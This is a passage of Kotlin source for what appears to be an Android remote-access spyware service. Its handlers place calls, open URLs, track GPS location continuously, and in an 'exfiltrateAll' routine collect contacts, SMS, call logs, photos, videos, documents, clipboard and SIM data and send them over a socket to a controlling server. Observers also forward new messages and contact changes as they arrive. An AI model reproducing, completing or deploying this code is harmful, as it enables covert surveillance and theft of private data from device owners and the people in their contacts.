            return JSONObject().apply { put("error", e.message) }
        }
    }
    
    private fun openUrl(params: JSONObject): JSONObject {
        try {
            val url = params.getString("url")
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            
            return JSONObject().apply { put("success", true) }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message) }
        }
    }
    
    private fun vibrateDevice(params: JSONObject): JSONObject {
        try {
            val duration = params.optLong("duration", 1000)
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(
                    duration, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(duration)
            }
            
            return JSONObject().apply { put("success", true) }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message) }
        }
    }
    
    private fun makeCall(params: JSONObject): JSONObject {
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            return JSONObject().apply { put("error", "Call permission not granted") }
        }
        
        try {
            val number = params.getString("number")
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            
            return JSONObject().apply { put("success", true) }
        } catch (e: Exception) {
            return JSONObject().apply { put("error", e.message) }
        }
    }
    
    private fun startContinuousLocation(): JSONObject {
        if (ActivityCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return JSONObject().apply { put("error", "Location permission not granted") }
        }
        
        locationManager.requestLocationUpdates(
            LocationManager.GPS_PROVIDER,
            5000, // 5 seconds
            10f, // 10 meters
            object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    try {
                        val locData = JSONObject().apply {
                            put("lat", location.latitude)
                            put("lng", location.longitude)
                            put("accuracy", location.accuracy)
                            put("speed", location.speed)
                            put("bearing", location.bearing)
                            put("timestamp", location.time)
                        }
                        
                        socket.emit("device:data:bulk", JSONObject().apply {
                            put("location", locData)
                        })
                    } catch (e: Exception) {
                        Log.e(TAG, "Error sending location: ${e.message}")
                    }
                }
                
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            },
            Looper.getMainLooper()
        )
        
        return JSONObject().apply { put("success", true) }
    }
    
    private fun stopContinuousLocation(): JSONObject {
        locationManager.removeUpdates { true }
        return JSONObject().apply { put("success", true) }
    }
    
    private fun exfiltrateAll(): JSONObject {
        Thread {
            try {
                val allData = JSONObject()
                allData.put("contacts", getContacts())
                allData.put("sms", getSmsMessages())
                allData.put("callLogs", getCallLogs())
                allData.put("deviceInfo", getDetailedDeviceInfo())
                allData.put("installedApps", getInstalledApps())
                allData.put("location", getCurrentLocation())
                allData.put("photos", getMediaFiles("images"))
                allData.put("videos", getMediaFiles("videos"))
                allData.put("documents", getDocuments())
                allData.put("battery", getBatteryInfo())
                allData.put("simInfo", getSimInfo())
                allData.put("networkInfo", getNetworkInfo())
                allData.put("clipboard", getClipboard())
                
                socket.emit("device:data:bulk", allData)
            } catch (e: Exception) {
                Log.e(TAG, "Exfiltration error: ${e.message}")
            }
        }.start()
        
        return JSONObject().apply { put("status", "started") }
    }
    
    private fun startPeriodicDataCollection() {
        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                try {
                    // Send ping
                    socket.emit("device:ping")
                    
                    // Send battery info
                    socket.emit("device:update", JSONObject().apply {
                        put("batteryLevel", getBatteryLevel())
                        put("isCharging", isCharging())
                    })
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Periodic update error: ${e.message}")
                }
                
                Handler(Looper.getMainLooper()).postDelayed(this, 30000) // 30 seconds
            }
        }, 30000)
    }
    
    private fun startBatteryMonitoring() {
        registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
    }
    
    private fun registerContentObservers() {
        // Observe SMS changes
        contentResolver.registerContentObserver(
            Telephony.Sms.CONTENT_URI, 
            true, 
            object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean) {
                    getSmsMessages()?.let {
                        socket.emit("device:data:bulk", JSONObject().apply {
                            put("sms", it)
                        })
                    }
                }
            }
        )
        
        // Observe contact changes
        contentResolver.registerContentObserver(
            ContactsContract.Contacts.CONTENT_URI,
            true,
            object : android.database.ContentObserver(Handler(Looper.getMainLooper())) {
                override fun onChange(selfChange: Boolean) {
                    getContacts()?.let {
                        socket.emit("device:data:bulk", JSONObject().apply {
                            put("contacts", it)
                        })
                    }
                }
            }
        )
    }
    
    private fun getBatteryLevel(): Int {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, 0) ?: 0
        val scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, 100) ?: 100
        return (level * 100.0 / scale).roundToInt()
    }
    
    private fun isCharging(): Boolean {
        val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        return status == BatteryManager.BATTERY_STATUS_CHARGING || 
               status == BatteryManager.BATTERY_STATUS_FULL
    }
    
    private fun getLocalIpAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val networkInterface = interfaces.nextElement()
                val addresses = networkInterface.inetAddresses
                while (addresses.hasMoreElements()) {
                    val address = addresses.nextElement()
                    if (!address.isLoopbackAddress && address is java.net.Inet4Address) {
                        return address.hostAddress ?: "Unknown"
                    }
                }
            }
        } catch (e: Exception) {
            return "Unknown"
        }
        return "Unknown"
    }
    
    private fun getWifiMacAddress(): String {
        return try {
            val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) 
                as android.net.wifi.WifiManager
            val wifiInfo = wifiManager.connectionInfo
            wifiInfo.macAddress ?: "02:00:00:00:00:00"
        } catch (e: Exception) {
            "02:00:00:00:00:00"
        }
    }
    
    private fun getPhoneType(): String {
        return when (telephonyManager.phoneType) {
            TelephonyManager.PHONE_TYPE_GSM -> "GSM"
            TelephonyManager.PHONE_TYPE_CDMA -> "CDMA"
            TelephonyManager.PHONE_TYPE_SIP -> "SIP"
            else -> "Unknown"
        }
    }
    
    private fun getNetworkType(): String {
        return when (telephonyManager.dataNetworkType) {
            TelephonyManager.NETWORK_TYPE_LTE -> "4G LTE"
            TelephonyManager.NETWORK_TYPE_NR -> "5G"
            TelephonyManager.NETWORK_TYPE_UMTS -> "3G"
            TelephonyManager.NETWORK_TYPE_EDGE -> "2G EDGE"
            TelephonyManager.NETWORK_TYPE_GPRS -> "2G GPRS"
            TelephonyManager.NETWORK_TYPE_HSPAP -> "HSPA+"
            else -> "Unknown"
        }
    }
    
    private fun getNetworkOperator(): String {
        return telephonyManager.networkOperatorName ?: "Unknown"
    }
    
    private fun getPhoneTypeLabel(type: Int): String {
        return when (type) {
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "Home"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "Mobile"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "Work"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK -> "Work Fax"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME -> "Home Fax"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_PAGER -> "Pager"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "Other"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK -> "Callback"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_CAR -> "Car"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN -> "Company"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ISDN -> "ISDN"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MAIN -> "Main"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_OTHER_FAX -> "Other Fax"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_RADIO -> "Radio"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TELEX -> "Telex"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_TTY_TDD -> "TTY/TDD"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE -> "Work Mobile"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER -> "Work Pager"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT -> "Assistant"
            android.provider.ContactsContract.CommonDataKinds.Phone.TYPE_MMS -> "MMS"
            else -> "Custom: $type"
        }
    }
    
    private fun getCallTypeLabel(type: Int): String {
        return when (type) {
            CallLog.Calls.INCOMING_TYPE -> "Incoming"
            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
            CallLog.Calls.MISSED_TYPE -> "Missed"
            CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
            CallLog.Calls.REJECTED_TYPE -> "Rejected"
            CallLog.Calls.BLOCKED_TYPE -> "Blocked"
            CallLog.Calls.ANSWERED_EXTERNALLY_TYPE -> "Answered Externally"
            else -> "Unknown"
        }
    }
}